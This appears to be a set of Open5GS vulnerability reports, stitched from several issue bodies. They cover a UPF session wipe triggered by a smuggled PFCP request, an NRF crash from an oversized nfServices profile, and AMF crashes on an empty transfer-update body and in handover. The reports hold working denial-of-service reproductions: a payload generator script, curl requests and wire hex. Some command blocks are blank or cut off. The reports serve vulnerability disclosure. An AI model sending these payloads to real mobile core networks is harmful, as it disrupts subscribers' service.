   deliberately **invalid mixed-bit description** (wire bytes `05 00`; only
   the pure GTP-U descriptions are decodable by Open5GS):

   | Field | Value |
   |---|---|
   | Header SEID | `0x6ab` (peer UE's UP F-SEID) |
   | UpdateFAR (IE 10) | FAR ID 1, Apply Action FORWARD (`0x0200`) |
   | Update Forwarding Parameters (IE 11) | Outer Header Creation (IE 84), description `05 00`, TEID `0x00000001`, IPv4 `192.168.232.140` |

5. Record the response cause, re-measure downlink delivery, inspect the victim
   UE's tunnel capture and the SMF/peer-UE logs.

### Logs (Attached)

[R6-upf-error-path-session-wipe.zip](https://github.com/user-attachments/files/31643350/R6-upf-error-path-session-wipe.zip)

The accepted association, the no-op success-path probe, then the single
rejected modification and its error-path signature (no success-path response
line afterwards):

```shell
08/30 11:53:20.584: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
08/30 11:53:20.886: [upf] DEBUG: Session Modification Response (../open5gs-src/src/upf/n4-build.c:91)   # no-op probe: success path, Cause 1
08/30 11:53:21.187: [upf] DEBUG: Session Modification Request (../open5gs-src/src/upf/n4-handler.c:258) # attack message, peer [10.45.0.2]:8805
08/30 11:53:21.187: [pfcp] ERROR: Unsupported Outer Header Creation Description (../open5gs-src/lib/pfcp/handler.c:1146)
# response: type 53, header SEID 0x444 (peer CP F-SEID), Cause 76 "Service not supported",
#           Offending-IE 0x54 (Outer Header Creation) — and NO success-path response line
```

The attack SMR's Outer Header Creation value bytes on the wire
(`driver_out.json` `sent_hex`, tail): `05000000 0001c0a8e88c` — description
`05 00`, TEID `0x00000001`, IPv4 `192.168.232.140`.

The attack request and its GTP-U smuggling are on the wire:
`capture-core-eth0-n4n3.pcap` carries the 52-byte Session Modification Request
inside GTP-U (outer `192.168.232.140:2152 -> 192.168.232.132:2152`, inner
`10.45.0.2:8805 -> 192.168.232.132:8805`, payload identical to the sent
datagram); no plain UDP/8805 datagram appears on the core wire.

Measured effect (id-matched ICMP probes, core -> peer `10.45.0.3`):

```text
N6 (core -> 10.45.0.3):   baseline 5/5 replies -> post-probe 0/5 (100% loss)
victim uesimtun0:         baseline 5 req / 5 replies -> post-probe empty (header-only pcap)
SMF log:                  no session release / modify — SMF still believes the session is up
peer UE log:              "PDU Session establishment is successful PSI[1] ... TUN interface[uesimtun0, 10.45.0.3] is up"
```

An independent second run (different lab window, peer session UP-SEID `0x170` / 368) shows the same wipe with its dataplane aftermath: the rejected request was answered Cause 76, and follow-up UpdateFAR probes on the same SEID — one per FAR-ID 1..5, starting 6 ms after the rejection — were each answered with `Cannot find FAR-ID[N] in PDR` (handler.c:1282; `FAR-ID[1]` at
`08:35:09.093`, `FAR-ID[2]` at `08:35:09.099`): the session's FARs were gone. 

The UPF then logged `Send Error Indication [TEID:0xa403] to [192.168.232.140]` (gtp-path.c) as downlink kept arriving with no matching
PDR. Peer loss was 100% in both directions and persisted for the whole observation window (~20 minutes) without any restore.

**Open5GS parses the 2-byte Outer Header Creation description with a raw little-endian struct copy, so the wire bytes `05 00` decode to the mixed-bit pattern it rejects (a 3GPP big-endian encoder places the same bits differently). The on-wire hex and the UPF log hexdump above are quoted verbatim.**

### Expected behaviour

A rejected update must not alter the session: only the offending IE's change is refused, the session's installed PDRs/FARs/URRs/QERs must be preserved untouched, and the error response must be sent against the intact session. `ogs_pfcp_sess_clear()` belongs to the legitimate session-removal paths, not to the modification error path.

### Observed Behaviour

The modification handler's error path tears down the whole session before answering:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_modification_request() */
...
cleanup:
    ogs_pfcp_sess_clear(&sess->pfcp);   /* n4-handler.c:440-444 — removes ALL
                                           PDRs/FARs/URRs/QERs of the resolved
                                           session (lib/pfcp/context.c:1283) */
    ogs_pfcp_send_error_message(...);   /* rejection answered after the wipe */
```

The rejection itself is correct — `lib/pfcp/handler.c` (outer-header-creation parsing, error at handler.c:1146) refuses non-pure GTP-U descriptions with Cause 76 + Offending-IE — but the handler routes **any** rejection through the `cleanup:` label above, so the error answer and the session destruction are the same code path. Nothing scopes the cleanup to the failed update; nothing
restores the previous state afterwards.

The target session is resolved from the header SEID alone (`src/upf/pfcp-sm.c:197`, via `upf_sess_find_by_upf_n4_seid()`,
`src/upf/context.c:290`), so the poisoned request can be addressed to any live session; but note the wipe occurs even
when the requester *is* the session's owner, so this defect is independent of the missing association-ownership check reported separately.


### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

This merged report covers both currently confirmed reachability variants that
hit the same `nf_service_pool` exhaustion crash site.

The shared bug is in the NF-service allocation path:

```c
nf_service = ogs_sbi_nf_service_add(
                nf_instance,
                NFService->service_instance_id,
                NFService->service_name, NFService->scheme);
ogs_assert(nf_service);
```

`ogs_sbi_nf_service_add()` allocates from a fixed pool and asserts on failure:

```c
ogs_pool_alloc(&nf_service_pool, &nf_service);
ogs_assert(nf_service);
```

The default sizing is:

```c
ogs_app()->pool.nf = global_conf.max.peer;
ogs_app()->pool.nf_service = ogs_app()->pool.nf * 16;
```

With default settings that yields `1024` service objects across the entire NRF
process. The same exhaustion crash is reachable via:

1. Direct server-side registration:
   `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
2. Client-response inter-PLMN discovery:
   `GET /nnrf-disc/v1/nf-instances`, where a malicious Home NRF returns an
   oversized `SearchResult.nfInstances[*].nfServices` payload

### Root cause

- Shared crash site:
  `../lib/sbi/context.c:1476-1477`
- Root cause family:
  resource exhaustion leading to assertion abort
- Direct reachability:
  `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Client-response reachability:
  inter-PLMN `GET /nnrf-disc/v1/nf-instances`
- Controlling field:
  `NFProfile.nfServices`

### Direct Reproduction

1. Generate a small control profile and a large malicious profile:

```bash
node <<'NODE'
const fs = require('fs');

function svc(i) {
  return {
    serviceInstanceId: `svc-${String(i).padStart(4, '0')}`,
    serviceName: 'nnrf-nfm',
    versions: [{ apiVersionInUri: 'v1', apiFullVersion: '1.0.0' }],
    scheme: 'http',
    nfServiceStatus: 'REGISTERED'
  };
}

const control = {
  nfInstanceId: '11111111-1111-1111-1111-111111111111',
  nfType: 'AMF',
  nfStatus: 'REGISTERED',
  fqdn: 'instance-control.example.org',
  nfServices: Array.from({ length: 4 }, (_, i) => svc(i + 1))
};

const bomb = {
  nfInstanceId: '22222222-2222-2222-2222-222222222222',
  nfType: 'AMF',
  nfStatus: 'REGISTERED',
  fqdn: 'instance-bomb.example.org',
  nfServices: Array.from({ length: 1100 }, (_, i) => svc(i + 1))
};

fs.writeFileSync('/tmp/nrf-service-control.json', JSON.stringify(control));
fs.writeFileSync('/tmp/nrf-service-bomb.json', JSON.stringify(bomb));
NODE
```

2. Control case:

```bash

docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 \
  -X PUT "http://$NRF_IP/nnrf-nfm/v1/nf-instances/11111111-1111-1111-1111-111111111111" \
  -H 'content-type: application/json' \
  --data @/tmp/nrf-service-control.json
```

3. Malicious case:

```bash

docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 15 \
  -X PUT "http://$NRF_IP/nnrf-nfm/v1/nf-instances/22222222-2222-2222-2222-222222222222" \
  -H 'content-type: application/json' \
  --data @/tmp/nrf-service-bomb.json

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
```

### Inter-PLMN Reproduction

1. Start the fake Home NRF helper:

```bash

  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \

```

```bash

```

3. Malicious case:

```bash

start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

```

```shell
exited 139 2026-04-12T06:15:31.626504086Z 0
04/12 06:15:31.514: [sbi] FATAL: ogs_sbi_nf_service_add: Assertion `nf_service' failed. (../lib/sbi/context.c:1477)

04/12 06:24:07.616: [sbi] FATAL: ogs_sbi_nf_service_add: Assertion `nf_service' failed. (../lib/sbi/context.c:1477)
```

### Expected behaviour

NRF should reject unreasonably large `nfServices` collections with a normal HTTP error and remain running, regardless of whether they arrive via direct registration or a trusted Home-NRF response.

Both direct registration and inter-PLMN discovery response parsing hit the same `nf_service_pool` exhaustion crash and terminate NRF with exit code `139`.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Description

AMF crashes when it receives an empty-body
`POST /namf-comm/v1/ue-contexts/{ueContextId}/transfer-update`
for a valid `ueContextId`, after the same UE has first gone through a normal
`/transfer` request that sets
`amf_ue->amf_ue_context_transfer_state = UE_CONTEXT_TRANSFER_OLD_AMF_STATE`.

This is distinct from the already documented
`unknown ueContextId` crash on the same route. Here, the handler reaches a
valid `amf_ue`, but `recvmsg->UeRegStatusUpdateReqData` remains `NULL` for the
empty request body. `amf_namf_comm_handle_registration_status_update_request()`
then dereferences `UeRegStatusUpdateReqData->transfer_status` without a NULL
check at open5gs/src/amf/namf-handler.c:1876.

Relevant code:

- open5gs/src/amf/namf-handler.c:1843
  stores `recvmsg->UeRegStatusUpdateReqData` in a local pointer.
- open5gs/src/amf/namf-handler.c:1858
  resolves the valid `ueContextId` to a live `amf_ue`.
- open5gs/src/amf/namf-handler.c:1866
  verifies the transfer state.
- open5gs/src/amf/namf-handler.c:1876
  dereferences `UeRegStatusUpdateReqData->transfer_status` unconditionally.

### Steps to reproduce

1. Start the Open5GS v2.7.7 Docker deployment and ensure the AMF SBI endpoint
   is reachable. In my live setup on 2026-04-12 the AMF container was `amf`
   and the SBI endpoint was `http://10.33.33.8:80`.
2. Register a real UE so AMF has a valid UE context. In my live setup I used:

```text

K:    00000000000000000000000000000000
OPC:  00000000000000000000000000000000
AMF:  8000
DNN:  internet
S-NSSAI: SST=1, SD=1
```

3. Control case: set the old-AMF transfer state with a valid `transfer`
   request, then send a valid `transfer-update` request. Both should succeed
   and AMF should remain running:

```bash
curl --http2-prior-knowledge -m 8 -sS -i \
  -X POST http://10.33.33.8/namf-comm/v1/ue-contexts/imsi-001011234567891/transfer \
  -H 'content-type: application/json' \
  --data '{"reason":"INIT_REG","accessType":"3GPP_ACCESS"}'

  -X POST http://10.33.33.8/namf-comm/v1/ue-contexts/imsi-001011234567891/transfer-update \
  -H 'content-type: application/json' \
  --data '{"transferStatus":"NOT_TRANSFERRED"}'
```

4. Malicious case: re-enter the same old-AMF transfer state with the valid
   `transfer` request, then send an empty-body `transfer-update` request:

```bash
curl --http2-prior-knowledge -m 8 -sS -i \
  -X POST http://10.33.33.8/namf-comm/v1/ue-contexts/imsi-001011234567891/transfer \

  -H 'content-type: application/json' \
  --data ''
```

5. Check container state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' amf
docker logs --tail 50 amf
```

### Open5GS Release, Revision, or Tag

v2.7.3

### Steps to reproduce

1. Process one: Handover required

- Deploy two GNBS, each configured with a different IP address, and use different IMSI to connect two different terminals.

- There is an executable but incomplete handover required message

- The original gNB-UE context will be released

[Problematic handover required process.zip](https://github.com/user-attachments/files/19863206/Problematic.handover.required.process.zip)


2. Process two: The loop of the initial process

- Configure a new UE (IMSI matching one from Step 1) to connect via a third gNB.

- The third UE repeatedly executes the processes such as initial registration, authentication, PDU session establishment, release, etc.


[Repeated imsi registration authentication pdu session establishment and release cycle process.zip](https://github.com/user-attachments/files/19863205/Repeated.imsi.registration.authentication.pdu.session.establishment.and.release.cycle.process.zip)

First, perform Process one, which will trigger the incomplete switching of the two gNBs requirements and create two additional gNB-UE contexts. Then before the release of the first two gNBS, start to repeat Process two multiple times. Observe the crash of AMF until the gNB of Process one is released.

We suspect that there is a conflict between the imsi of Process One and Process two. Therefore, when process Two is executed, the gnb in Process One is released, resulting in the release of the context of Process Two as well. Thus, the problem of not being able to find the ran_ue value occurs.
